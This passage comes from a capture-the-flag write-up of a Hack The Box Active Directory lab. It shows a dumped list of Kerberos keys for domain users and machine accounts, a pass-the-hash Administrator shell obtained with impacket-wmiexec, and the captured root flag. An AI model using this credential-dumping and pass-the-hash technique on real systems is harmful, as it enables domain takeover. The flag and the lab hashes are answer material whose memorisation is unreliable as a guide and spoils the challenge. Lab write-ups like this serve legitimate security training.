htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
hacker:aes256-cts-hmac-sha1-96:cd0408fed362e3b8b317febe9afbd2f831cbf15e2f474396876046c37cdfc4c9
hacker:aes128-cts-hmac-sha1-96:91fd1415be734f1f5a68f02bf20a00bf
hacker:des-cbc-md5:25e573295efbbffd
FOREST$:aes256-cts-hmac-sha1-96:080ccda24ef35a1806ba47577ecdd9e4a4a49b527f16f20504fb22b55f8b26e1
FOREST$:aes128-cts-hmac-sha1-96:3e61c71a2ba5c01bdcd9a7f78cfa8978
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

Logged in as user "Administrator".

```
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.129.59.98
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
d664a3cfbf3f885d730c1da94f858a7b
```

